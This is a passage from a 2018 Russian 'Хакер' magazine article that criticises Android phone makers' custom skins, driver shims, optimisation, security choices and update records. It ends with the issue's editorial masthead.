тройках, а контролируются чем‐то вроде того, что показано на скриншоте
ниже.





И если в стандартном Android даже те уведомления, для которых вдруг раз‐
решен  звук, проиграют бесшумное уведомление, то разработчики HTC
решили иначе: для каждого уведомления будет проигры ваться какой‐то звук,
никак не связанный с тем, что было выб рано в нас тройках. У тебя установлена
сотня приложе ний? Будь добр пройтись по всем в настрой ках HTC и отклю‐
чить звук для каждого из них. Установил новое приложение? Не забудь зайти
в настройки уведомлений и отключить ему звук, иначе тебя может побеспоко‐
ить неприятный сюр приз.
  Почему такая мелочь стоила такого количества букв? Да просто потому,
что на собственном HTC U11 я убил больше полутора часов, пытаясь отрубить
звуковые уведомления для всех приложений, — и все равно время от вре‐
мени телефон подает голос! Чес тное слово, это «улучшение» — уже дос‐
таточная причина, чтобы избавиться от назойливого флагмана.
   Скажешь, это баг и его испра вят в будущей версии? Давай посмотрим.
Android 8.0 с дан ным улучшением пришел на HTC U11 в декабре 2017‐го.
Январь, февраль, март… обновлений нет, как нет и внятного понимания,
будут ли вообще устранять этот баг — или же это такая фича.
   Кстати, поругав HTC, не могу не оста новиться на оболочке LG, в которой
вообще нельзя выбрать «беззвучный» тон для уведомлений! Сама мысль
о том, что кому‐то может не понравиться постоянный трезвон телефона,
не посетила головы программистов LG.





Результат? Приходится извращать ся, создавая файл с «пустым» зву ком. А про
звук начала и окончания зарядки, который невозможно отключить из настро‐
ек, я и вовсе мол чу: телефон еженощно радует бодрым пиликаньем: «Ура! Я
зарядился!»
  А теперь вопрос на засыпку: думаешь, это такой баг? Нет! Это сознатель‐
ное решение программистов (ну не дизай неров UI же) из LG, кочу ющее
из одной версии Android в другую. 5.0, 5.1, 6.0, 7.0 — везде одна и та же кар‐
тина. Молодцы, здорово улучшили!


СОВСЕМ КАК IPHONE, ТОЛЬКО ЛЕГКИЙ!
В HTC уведомления работа ют и выглядят именно так, как дол жны по замыслу
разработчиков Android. А вот некоторые дру гие производители любят «делать
красиво», уродуя стандартный дизайн Android и пыта ясь сделать, «как в айфо‐
нах». Получается… получается очень плохо. Примерно как в китайских бум‐
боксах из девяностых с кучей мигающих лампочек и ярких цве тов.
   Вот так это выглядит у Huawei (справа — «чистый» Android):





А вот какой кошмар сделала небезызвестная LeEco:





А вот так представляют себе идеальный интерфейс Android 6.0 в LG. Очень
крупные кнопки навига ции, очень крупные иконки переключателей сверху,
которые очевидно не влезли в раз мер, и уже без того улучшенные стандар‐
тные  переключатели  пришлось  дополнительно  улучшать  при  помощи
горизонтальной прокрутки.





Чем плохи такие интерфейсы? Как и все свис телки‐мигалки, подобные
интерфейсы мало того что говорят о дурном вкусе («о вкусах не спорят» —
не в эту оперу; вкусы у человека будут плохими и даже ужас ными, если их
не воспитывать с детства), так еще и ломают пользовательский опыт резкими
переходами между ставшим уже клас сичес ким материальным дизайном An‐
droid и цветастым полупрозрачным изыском азиатских программистов.
  Еще один момент, который часть производителей пытается сделать так,
как сделано в iOS, — управление яркостью экрана. В свежих версиях Android
при включении автоматичес кого управления яркостью пол зунок контролирует
не яркость напрямую, а кривую зависимости яркости экрана от внешнего
освещения. Это логично: дос таточно один раз выставить пол зунок в удобное
положение, и о нем можно забыть навсегда.
   Увы, но ряд производителей «улучшает» эту логику, привязывая пол зунок
яркости в авторежиме напрямую к уровню подсветки экрана. Так, например,
сделали разработчики OnePlus (как всем извес тно, их прошивка OxygenOS —
это как чистый Android, только лучше). В результате, если выбранные авто‐
матикой уровни яркости не устраивают, ползунок приходится постоянно дви‐
гать туда‐сюда. То, что именно так орга низовано управление яркостью в iOS,
не спасает от приступов раздражения.
   Говоря о OnePlus пос ледних моделей, нельзя не упомянуть и еще одно
важное  «улучшение». В компании решили добавить аппаратный перек‐
лючатель режимов уведомлений, сделав его «как в iPhone, только лучше».
Трехпозиционный переключатель в OnePlus 5 и 5T поз воляет удобно и быстро
переключаться между зву ковыми и беззвучными режимами уведомлений.
Казалось бы, удоб но! Увы, совсем нет: китай ские программисты не сумели
осилить логику переключения режимов уведомлений Android и полностью
выпилили из прошив ки такую полезную вещь, как автомати ческое включение
режима «не беспокоить» по рас писанию и по событиям (например, по важ‐
ным встречам в календаре). Пользователю предлагается перенестись назад
в те благословенные времена, где не было умной электроники, а было много
железных тумблеров. Хочешь бесшумный режим на ночь? Переключи тум‐
блер! Забыл переключить и тебя раз будила пришедшая рано утром рек‐
ламная SMS? Не надо винить рукастых программистов из Китая, просто
в следующий раз не забывай перещелкнуть тумблер.


ОПТИМИЗАЦИЯ
За что я люблю смартфоны Pixel — так это за идеальную, просто образцо‐
во‐показательную оптимиза цию. При том что первое поколение Pixel исполь‐
зовало процессоры с зарезанными час тотами и комплектовалось медленной
по стандартам 2016 года памятью eMMC (остальные флагманы выходили
на более шустрой UFS 2.0), смартфоны от Google работают идеально плавно,
как по маслу. Нет лагов и подергиваний анимаций, нет неожиданных перег‐
ревов, нет ужасной неторопливос ти после того, как смартфон «просыпается»
из состояния глубокого сна. Приложения запус кают ся с предсказуемой ско‐
ростью и работают предсказуемо плавно. Честно говоря, именно четкость
и плавность работы Pixel — то, чего ста ло заметно не хватать на последних
версиях iOS.
  Сравнивая Pixel первого поколения с псевдофлагманом HTC U Ultra (Snap‐
dragon 821, UFS 2.0) невозможно не заметить, что смартфон от HTC: а) перег‐
ревается на простейших задачах и  б) подтормаживает и подлагивает,
оставляя ощущение, что процессор работает из последних сил. Просыпаясь
из состояния глубокого сна, первые несколько секунд U Ultra нетороплив,
как сонная черепаха (вплоть до того, что шторка уведомлений откры вается
рывками, да и то после заметной задержки). Что это — проблема Android?
Нет: на Pixel, работающем на похожем железе, ничего подобного не наб‐
людается. Просто пло хая, очень плохая опти миза ция.
  Подобных примеров я могу привести мас су. LG G Flex 2 — перегрев, при‐
чем зачастую в состоянии прос тоя, когда устрой ство вдруг начинало что‐то
считать с выключенным экра ном, обжигая карман. Об утечках заряда из‐за
непобежденных wakelock’ов ядра, приводя щих к аномальному поведению
смартфона в простое, можно писать серию статей; справиться с такими
вещами невозможно даже с рут‐дос тупом, поможет только исправление
от производителя или кастомная прошивка.


КРИТИЧЕСКИЕ ОШИБКИ И НЕДОДЕЛКИ
Как тебе понравится, если твой телефон превратится в «кирпич» пос ле оче‐
редного обновле ния? Ситуация достаточно редкая для большинства про‐
изводителей,  но,  увы, встречающаяся. Впрочем, если баг  затрагивает
небольшое количество пользователей и лишь время от времени — серьезно‐
го ущерба репутации производителя он не принесет. А вот если все устрой‐
ства после получения ОТА вдруг начинают блокиро ваться — это уже не очень
хорошо.
  Именно такое «улучшение» внес ли в Android горе‐разработчики OnePlus.
С выходом Android 8 что‐то пошло не так, и абсолютно все пользователи
устройств OnePlus 5 с раз блокированными загрузчиками, установившие пер‐
вое, второе, а потом и третье обновление (их выпускали с перерывом меньше
недели), получили ошибку рас шифровки данных: телефоны не загружались.
Сброс данных и последующее вос ста новление из облачной резервной копии
помогали — ровно до следующего обновления.


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
    ПЛОХОЙ АНДРОИД
                 КАК ПРОИЗВОДИТЕЛИ ПРЕВРАЩАЮТ
                  ХОРОШУЮ ОС В ТОРМОЗНОЕ
                  НЕОБНОВЛЯЕМОЕ УБОЖЕСТВО





КАЧЕСТВО ДРАЙВЕРОВ
О качестве драйверов в Android можно писать много хорошего, но всегда ли
виноват произво дитель? Ведь некото рые драйверы пос тавляет произво‐
дитель чипсета (к примеру, Qualcomm), а некоторые — например, к модулю
видеокамеры — и вовсе сторонние компании‐про изводите ли. Уди вительно,
что эта «сборная солянка» вообще работает… впрочем, стоп: а работает ли?
   Возьмем для примера ту же компанию OnePlus, программисты которой
допустили критическую ошибку, не учтя особенностей шифрования восьмой
версии Android. Компания уста новила «револю ционный» модуль камеры,
на матрице которого присутс тву ют дат чики фазовой фокусировки. Мар‐
кетологи глубоко вдохнули и анонсирова ли OnePlus 5 под лозунгом «Clearer
photos». Казалось бы, что может пойти не так?
  Давай посмотрим на вот эту фотографию:





Что это? Почему небо в горошек? Как ока залось, в OnePlus сэкономили,
заказав у SONY модуль с драйверами, но решив не оплачивать дальнейшую
разработку и исправление найденных ошибок. В результате драй веры SONY
не учитывают фазовые точки фокусировки, которые и выглядят на снимках
как бодрый горох. Очевидно, такие снимки невозможно было бы продать
как «clearer photos», и прог раммистам OnePlus была поставле на задача
замаскировать проб лему. Что они успешно и про дела ли, включив запредель‐
ные настройки шумоподавления, вмес те с «горохом» фазовых точек съеда‐
ющих и все мелкие детали на снимке. Проблема решена!
  Думаешь, единич ный слу чай? Ничего подоб ного: с тем же модулем, с теми
же драйверами и ровно с теми же проб лемами полгода спустя компания
выпускает второй телефон, OnePlus 5T. Наступили на те же грабли после дол‐
гой и громкой ругани поль зователей? Какая разница, если и так купят!


ПОЧЕМУ СМАРТФОНЫ С ANDROID РАБОТАЮТ МЕДЛЕННЕЕ ПОСЛЕ
ОБНОВЛЕНИЙ
О качестве драйверов мы уже рас ска зали. Именно драйверы могут стать при‐
чиной плохой работы устройства. Особенно явно это становится заметно тог‐
да, когда производитель реша ет сэкономить и обновля ет версию Android,
оставляя без изменения оригинальные драйверы.
   Как это возможно? Вплоть до Android 8 с его Project Treble каждая новая
версия Android вклю чала ряд изменений в API, заставляя производителей
чипсетов выпускать новые версии драйверов для крупных обновлений сис‐
темы. Выпуск драйверов не бесплатен, и производителям приходилось пла‐
тить за обновленный код — или по факту, или в рамках заключенного контрак‐
та при закупке мик росхем. Но что, если производитель не хочет оплачивать
новые драйверы, а обновлять систему при ходится? В таких случаях час то
прибегают к программной прослойке, транслирующей новые вызовы API к той
версии API, которую поддерживают старые драй веры. Вообще говоря, так
делать неправильно; такой подход явно огра ничивает и производительность,
и совместимость системы, часто не дает доступа к новым воз можнос тям све‐
жей версии Android. Тем не менее этот подход весьма популя рен среди раз‐
работчиков кастомных прошивок — хотя бы потому, что свежих драйверов
может просто не быть (классичес кий пример из недавних — выпуск кас‐
томных прошивок с Android  7, 8 и 8.1 для смартфонов LeEco, которые
не получали обновлений базовой версии Android 6.0 с момента выхода).
  К сожалению, отдельные производители используют ровно тот же подход.
Смартфоны OnePlus 5, 5T были выпущены с Android 7 на борту. Обновле ние
до Android 8 использовало старые драйверы и программную прокладку
(shim).
   Опять же, думаешь — единичный случай, да еще и у маргинальной китай‐
ской компании? А если я скажу, что ровно тем же самым балуется крупней‐
ший производитель смартфонов на Android — компания Samsung, да еще
и не для чьих‐то там чипов, а для собственных чипсетов Exynos?


             INFO

                      Если тебя заинтересовала система «прокладок»
                       для эмуляции новых API, рекомендуем статью
                      Cameras in Custom ROMs: How Developers Make
                       Hardware Work without Source Code.



SAMSUNG И ОБНОВЛЕНИЯ
Для начала — статья: Samsung, Exynos and AOSP Explained: A Story of Betrayal.
  В этой статье разработчики очень подробно и детально описывают,
как именно в Samsung все, что можно сделать неправильно, сделано неп‐
равильно. В частности, Samsung час то использует программные прослойки
для трансляции API при обновлении версий Android. После многочисленных
обновлений изменения накапливаются, программные прокладки становятся
все тол ще, а производительность — все хуже. Именно из‐за многочисленных
прослоек оболочка от Samsung со временем начинает работать из рук вон
плохо даже на мощ нейших устройствах. Это про исходит вовсе не потому, что
Samsung их как‐то специально искусс твенно замедляет; просто иначе они
не умеют.


КАЧЕСТВО КОДА У SAMSUNG
Мы обсудили свистелки и исковерканный UI, отсутствие оптимизации и низ‐
кое качество драйверов. Как еще мож но испортить Android? Оказывается,
легко. Достаточно просто быть Samsung.
   Если многие производители делают софт и драйверы из подручного
материала и палок, то программистам Samsung палок не завезли. На выходе
получается оболочка, умудряющаяся заметно подтормаживать и подлагивать
на процессоре, мощ ность которо го превос ходит CPU ультрабуков.
  Наверное, ты сейчас дума ешь: ну конечно, в Samsung все дураки, один
автор статьи такой умный! Все или не все, но уро вень программистов в Sam‐
sung уж точно ниже нулевой отметки. Вспомним историю с собс твенной раз‐
работкой компании, ОС Tizen, о которой писали буквально сле дующее:



      Воз можно, это худ ший код из тех, что мне довелось видеть. Все
     ошибки, которые можно было допус тить, были допуще ны. Оче видно,
      что  код  писал  или  проверял  кто‑то,  кто  ничего  не  понима ет
      в безопас ности. Это все рав но, что поп росить школьника написать
      для вас програм мное обес печение.
     Ис точник

Конечно же, в Samsung не могли не отреагировать на такое заявление. После
того как результаты исследования были опуб ликованы на Motherboard, ком‐
пания Samsung начала работу над исправлениями. Результат впечатляет: код
Tizen больше не «худший в истории». Теперь это просто ужас, но не
ужас‐ужас.
   Да, но при чем здесь Tizen, ведь говорим‐то мы об Android? И дей стви‐
тельно, та часть ПО Samsung, которая написа на специалистами Google, впол‐
не работоспособ на. Проблема же в том, что Samsung стремится максималь‐
но переписать, переделать ОС от Google, заменив все, что можно, прог‐
раммами собственного изготовления, переделав сис тему как визуально, так
и изнутри. Результат? Лаги, подторма живания, аля поватые и непоследова‐
тельные визуально‐графичес кие решения в интерфейсе и многочисленные
баги.
  А приложения‐дубликаты? Когда я покупал свой первый смартфон на An‐
droid, я сразу запутался. Почему есть «контакты» и «контакты»? Зачем два
разных браузе ра? Почему есть «часы» и «часы»? Для чего два почтовых кли‐
ента? Со временем уважающие себя производители перестали включать
приложения собственной разработки, дуб лирующие основную функциональ‐
ность Android. Но не Samsung, упорно вставляющая собственный веб‐бра‐
узер (зачем? Он что, умеет переводить стра ницы с иностранных языков
или синхронизировать пароли с облаком Google?), собственный почтовый
клиент и массу других утилит собственной разработ ки.
  А  знаменитая кнопка  Bixby,  случайное нажатие которой  активирует
ассистента? Отключить эту кнопку можно, но для этого нужно сначала настро‐
ить Bixby, а для это го — скачать и уста новить мно жес тво мусорных программ
от Samsung, о которых я уже рас ска зывал.
  Отдельно отмечу потрясающую находку Samsung в области безопасности.
  В любом другом смартфоне, сертифицированном Google, для раз бло‐
кирования загрузчика нужно сначала разрешить OEM Unlocking в настройках,
потом перегрузиться в fastboot, раз блокировать заг рузчик командой fastboot
oem unlock или подобной — и сразу же лишиться всех данных. Уничтожение
данных при разблокиро вании загрузчика — важ нейший элемент безопас‐
ности, позволяющий защитить данные от несанкционированного доступа
через рут или кастомное рекавери.
  В Samsung (по крайней мере, в модели Galaxy S8) разблокирование заг‐
рузчика делается так: разрешить OEM Unlocking в нас тройках и… и все. Мож‐
но  загружаться в кастомное рекавери, ставить  рут, извлекать данные.
Зияющая дыра в безопасности, оставлен ная как будто спе циально, — причем
страдают от нее вовсе не любители поставить рут или кастомную прошивку,
а самые обычные пользователи, данные которых могут быть запросто слиты
с использованием разбло кированного загрузчика.
   Если после всего перечисленного ты все равно считаешь вариант Android
от Samsung «нормальным» — мне нечего добавить.


ОБНОВЛЕНИЯ
Хорошая опе рационная система обновляется быс тро, четко и по рас‐
писанию. Apple iOS уже давно считает ся эталоном в отношении обновлений,
но есть и другие произво дители, которые прекрасно обновля ют свои устрой‐
ства. Для начала посмотрим на эту табличку (ис точник):





Как видишь, Apple и Microsoft обновляют свои устрой ства в течение длитель‐
ного срока, регулярно и сво евременно. Более того, Microsoft продол жает
обновлять смартфоны на Windows 10 Mobile — даже те, которые были
выпущены сторонними производителями! — нес мотря на отказ от развития
платформы. Такая политика достойна уважения, ведь подавляющее боль‐
шинство производителей смартфо нов на Android обновляет свои модели
по принципу: «Будет хорошо продаваться — может, когда‐то и обновим.
Нет — тихо забудем».
   Вот, к примеру, HTC. Не самое дешевое устройство HTC U Ultra (Snapdrag‐
on 821) уже ровно год работа ет на все той же версии Android 7.0, с которой
оно вышло в продажу. Обновлений до промежуточных версий Android у HTC
не предусмотрено. Последний патч безопас ности для U Ultra был в ноябре,
а рассылка Android 8.0 (спустя полгода пос ле выхода этой версии ОС) то
начинается, то снова прекращается из‐за найденных ошибок.
 • Обновление до Android 8.0 для текущего флаг мана (U11): 99 дней
 • Обновление до Android 8.0 для предыду щего флаг мана (HTC 10): 180 дней
 • Информация об обновлениях: пло хо (только список устройств, которые
   получат обновле ние)
 • Результат: плохо

Несколько лучше обстоят дела у OnePlus:
 • Обновление до Android 8.0 для текущего флаг мана (5/5T): 137 дней
 • Обновление до Android 8.0 для предыду щего флаг мана (3/3T): 91 день
 • Информация об обновлениях: средне (форум, открытые бета‐версии)
 • Результат: противоречивый

Motorola когда‐то являла собой пример компании, которая не только под‐
держивала свои устройства в течение длительного времени, но и быстро их
обновляла до актуальных вер сий Android благодаря использованию чис той
версии системы.
 • Обновление до Android 8.0 для текущего флагмана (Moto Z2 Force):
   124 дня
 • Обновление до Android 8.0 для предыду щего флагмана (Moto Z): до сих
   пор нет; больше 200 дней
 • Информация об обновлениях: пло хо (только список устройств, которые
   получат обновле ние)
 • Результат: неудовлетво ритель но

LG печально известна своей неторопливостью. Еще бы: обновить настолько
сильно «улучшенную» обо лочку — это сколько работы улучшателям!
 • Обновление до Android 8.0 для текущего флаг мана (V30): 166 дней
 • Обновление до Android 8.0 для предыду щего флагмана (G6): до сих пор
   нет; больше 200 дней
 • Информация об обновлениях: пло хо
 • Результат: неудовлетво ритель но

А как обстоят дела у Samsung? Крупнейший производитель смартфонов с An‐
droid оказался и самым неторопливым среди конкурентов.
 • Обновление до Android 8.0 для текущего флаг мана (S8): 172 дня
 • Обновление до Android 8.0 для предыду щего флагмана (S7): до сих пор
   нет; больше 200 дней
 • Информация об обновлениях: пло хо
 • Результат: неудовлетво ритель но

Samsung — самая неторопливая? Подож ди, мы еще не видели BlackBerry!
Обновляемость устрой ства на Android никак не зависит от именитости ком‐
пании, громких обещаний или цены устройства. Компания BlackBerry, которая
обещала двухлетнюю поддержку для DTEK60 (между прочим, Snapdragon
820 и совсем не божес кая цена), с момента выхода устройства в 2016‐м
выпустила обновле ний Android… ноль. А что с двухлетней поддержкой?
Видимо, имелись в виду исключитель но патчи безопасности.
 • Обновление до Android 8.0 для текущего флагмана: до сих пор нет (боль‐
  ше 200 дней)
 • Обновление до Android 8.0 для предыду щего флаг мана: никогда
 • Обновление до Android 7.0 для предыду щего флаг мана: никогда
 • Информация об обновлениях: очень плохо (нет пол ного списка устройств,
   которые получат обновление)
 • Результат: хуже некуда

А есть ли производители, которые аккуратно обновляют Android? Да, их два:
Google и Nokia. Про Google можно особо не говорить: основная фишка их
устройств как раз в получении обновлений напрямую от производите ля.
  Обновления Android от Google:
 • Обновление до Android 8.0 для текущего поколения устройств: 9 дней
   (0 дней для участников бета‐тес тирова ния)
 • Обновление до Android 8.0 для предыдущего поколения: 18 дней (0–
   18 дней для участников бета‐тес тирова ния)
 • Информация об обновлениях: хорошо (пуб личные бета‐версии через
   ОТА)
 • Результат: отличный

Еще одна компания, регулярно обновляющая версии Android (по край ней
мере, на флагманах), — «новая» Nokia под управлением HMD Global. У ком‐
пании пока всего один флагман, выпущен ный на предыду щей версии Android,
и статистику мы еще не накопили. Тем не менее первоначальный результат
обнадеживает.
  Обновления Android от Nokia:
 • Обновление до Android 8.0 для текущего флаг мана: 90 дней
 • Обновление до Android 8.1 для текущего флаг мана: 58 дней
 • Информация об обновлениях: хорошо
 • Результат: хороший


ЗАКЛЮЧЕНИЕ
В хорошей мобильной ОС прекрасно все: и драй веры, и внешний вид (даже
если внешний вид системы — вопрос вкуса, то пос ледовательность в исполь‐
зовании выбранной концепции интерфей са уже вполне объ ективный показа‐
тель). Разуме ется, очень важна плавность работы. Немаловажны и вопросы
безопасности, поддержки и регулярных обновлений со стороны произво‐
дителя. Именно такой пользовательский опыт предлагает Google в своих
линейках Pixel и Pixel 2.
  К сожалению, у других производителей дела обсто ят далеко не так радуж‐
но. Исковерканные, без вкусные вариации пользовательских интерфейсов (и
я сейчас не о дизайне домашнего экра на — лаунчер‐то заменить легко), ази‐
атские свистелки‐пищалки, «улучшенные» уведомления, которые физически
невозможно заставить замолчать, зияющие дыры в безопасности, оставлен‐
ные будто бы нарочно, отвратитель ного качества драйверы, которые через
программные прокладки будут использовать ся снова и снова в новых версиях
Android — при усло вии, что эти новые версии вооб ще будут… Все эти вещи —
отличный повод поругать Android.
   №04 (229)
             Илья Русанен          Алексей Глазков       Андрей Письменный
              Глав ный редактор       Выпускающий редактор         Шеф‐редак тор
                rusanen@glc.ru               glazkov@glc.ru             pismenny@glc.ru
                                 Евгения Шарипо ва
                                     Литературный редактор


                           РЕ ДАК ТОРЫ РУБРИК
          Андрей Письменный        Илья Русанен          Александр «Dr.»
               pismenny@glc.ru             rusanen@glc.ru            Лозовский
                                                                           lozovsky@glc.ru
                  aLLy              Ев гений Зобнин        Антон «ant» Жуков
            iam@russiansecurity.expert          zobnin@glc.ru               zhukov@glc.ru


                          MEGANEWS
                           Мария Нефёдова
                                     nefedova.maria@gameland.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕК ЛАМА

                                  Анна Яков лева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по подписке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Друж бы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколам ское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязательно сов пада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редак ция
не несет ответственности за содер жание рекламных объ явлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2018